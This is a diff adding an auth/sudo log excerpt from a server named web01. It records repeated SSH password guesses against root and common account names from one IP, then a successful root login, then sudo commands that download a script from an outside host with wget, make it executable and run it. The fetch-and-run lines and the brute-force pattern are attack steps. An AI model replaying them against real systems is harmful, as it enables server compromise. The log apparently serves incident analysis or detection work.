@@ -1,0 +1,18 @@
+Jun 12 03:14:02 web01 sshd[10321]: Failed password for invalid user admin from 185.220.101.47 port 51422 ssh2
+Jun 12 03:14:05 web01 sshd[10322]: Failed password for invalid user admin from 185.220.101.47 port 51430 ssh2
+Jun 12 03:14:08 web01 sshd[10323]: Failed password for root from 185.220.101.47 port 51438 ssh2
+Jun 12 03:14:11 web01 sshd[10324]: Failed password for root from 185.220.101.47 port 51446 ssh2
+Jun 12 03:14:14 web01 sshd[10325]: Failed password for invalid user test from 185.220.101.47 port 51454 ssh2
+Jun 12 03:14:17 web01 sshd[10326]: Failed password for invalid user oracle from 185.220.101.47 port 51462 ssh2
+Jun 12 03:14:20 web01 sshd[10327]: Failed password for invalid user postgres from 185.220.101.47 port 51470 ssh2
+Jun 12 03:14:23 web01 sshd[10328]: Failed password for invalid user ubuntu from 185.220.101.47 port 51478 ssh2
+Jun 12 03:14:26 web01 sshd[10329]: Failed password for invalid user git from 185.220.101.47 port 51486 ssh2
+Jun 12 03:14:29 web01 sshd[10330]: Failed password for root from 185.220.101.47 port 51494 ssh2
+Jun 12 03:14:32 web01 sshd[10331]: Failed password for root from 185.220.101.47 port 51502 ssh2
+Jun 12 03:14:35 web01 sshd[10332]: Failed password for invalid user admin from 185.220.101.47 port 51510 ssh2
+Jun 12 03:14:41 web01 sshd[10333]: Accepted password for root from 185.220.101.47 port 51522 ssh2
+Jun 12 03:14:41 web01 sshd[10333]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Jun 12 03:15:02 web01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://45.132.192.19/update.sh -O /tmp/update.sh
+Jun 12 03:15:05 web01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/update.sh
+Jun 12 03:15:06 web01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/tmp/update.sh
+Jun 12 03:15:40 web01 sshd[10333]: pam_unix(sshd:session): session closed for user root
